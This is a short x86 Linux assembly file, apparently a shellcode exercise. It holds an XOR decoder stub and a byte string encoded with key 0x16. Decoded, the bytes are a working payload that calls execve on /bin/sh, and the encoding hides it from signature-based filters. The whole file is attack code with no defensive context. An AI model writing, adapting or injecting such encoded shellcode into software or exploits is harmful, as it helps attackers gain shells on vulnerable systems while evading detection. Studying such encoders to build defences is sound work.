; Decoder 

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi 

decode: 
	xor byte [esi], 0x16
	jz EncodedShellcode
	inc esi
	jmp short decode


call_shellcode:
	call decoder
	EncodedShellcode: db 0x27,0xd6,0x46,0x7e,0x39,0x39,0x65,0x7e,0x7e,0x39,0x74,0x7f,0x78,0x9f,0xf5,0x46,0x9f,0xf4,0x45,0x9f,0xf7,0xa6,0x1d,0xdb,0x96,0x16





